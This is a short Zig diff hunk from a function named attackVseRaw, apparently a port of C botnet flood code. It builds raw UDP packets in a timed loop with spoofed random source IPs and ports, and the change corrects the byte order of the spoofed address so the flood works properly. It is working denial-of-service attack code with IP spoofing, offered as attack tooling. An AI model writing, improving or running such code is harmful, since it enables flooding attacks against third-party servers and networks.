@@ -91,7 +91,7 @@ pub fn attackVseRaw(ip: u32, port: u16, duration: u32) void {
 
     while (std.time.timestamp() < end_time) {
         // Rotate source IP/port (from C: lines 62-67)
-        iph.saddr = rng.next(); // Random spoofed source
+        iph.saddr = std.mem.nativeToBig(u32, rng.next()); // Random spoofed source
         iph.id = std.mem.nativeToBig(u16, @truncate(rng.next()));
         udph.sport = std.mem.nativeToBig(u16, @truncate(rng.next()));
 
